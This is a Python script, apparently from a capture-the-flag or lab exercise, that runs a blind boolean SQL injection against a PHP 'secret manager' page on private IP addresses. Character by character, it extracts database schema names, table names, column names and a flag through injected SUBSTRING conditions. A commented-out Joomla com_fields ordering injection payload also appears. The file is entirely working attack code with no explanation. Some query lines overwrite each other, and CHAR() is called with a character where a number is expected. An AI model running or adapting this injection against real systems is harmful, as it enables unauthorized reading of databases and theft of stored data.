import os
import requests



print("running...")

#target = "http://10.102.181.239/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)"

#condition = "1573=1573"

#target = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR '1'='1"

test = "Config correctly set"
#test = "The most recent request was denied because it contained an invalid security token. Please refresh the page and try again."

chars = " -_abcdefghijklmnopqrstuvwxyz0123456789}{)($£!@./\\*][~';:,><`¬%\"\n"
import string
chars = string.printable
#chars = "0123456789"

def check(st):
    r = requests.get(st)
    #print(len(r.text))
    if test in r.text:
        return True
    else:
        return False


tmp = ""
counter = -1000


answers = []
for j in range(193, 500):
    tmp = "{}: ".format(j)
    tmpp = ""
    notFound = False
    for i in range(1,20):
        letterFound = False

        #for char in range(0, 128):
        for char in chars:
            
            # GET DB NAME
            #query = "http://10.102.160.192/s3cret_manag3r_pag3.php?name=' OR SUBSTRING(DATABASE(),{},1)='{}".format(i, char)     
            query = "http://10.102.160.192/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT {},1),{},1)='{}' OR '".format(j, i, char)

            
            # GET TABLE NAMES
            #query = "http://10.102.160.192/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {},1),{},1)='{}".format(j, i, char) 
            query = "http://10.102.160.192/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {},1),{},1)=CHAR({}) OR '".format(j, i, char) 
            #query = "http://10.102.160.192/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {},1),{},1)='{}' OR '".format(j, i, char)  # flag_table

            # GET COLUMN NAMES
            #query = "http://10.102.160.192/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='flag_table' LIMIT {},1),{},1)='{}' OR '".format(j, i, char)    # flag


            # TRYING TO GET FLAG
            query = "http://10.102.160.192/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT flag FROM flag_table LIMIT {},1),{},1)=CHAR({}) OR '".format(j, i, char) 
            #query = "http://10.102.160.192/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT flag FROM flag_table LIMIT {},1),{},1)='{}' OR '".format(j, i, char) 
            #query = "http://10.102.160.192/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT * FROM flag_table LIMIT {},1),{},1)='{}' OR '".format(j, i, char)    # flag

            # schema_name = 'secret_db' 
            query = "http://10.102.160.192/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT table_name FROM information_schema.tables WHERE DATABASE = 'secret_db' LIMIT {},1),{},1)='{}".format(j, i, char) 
            #print(query)

            if check(query):
                #print(char)
                tmp += char
                print(tmp)
                letterFound = True
                break
            counter += 1


    print(tmp)
    answers.append(tmp)



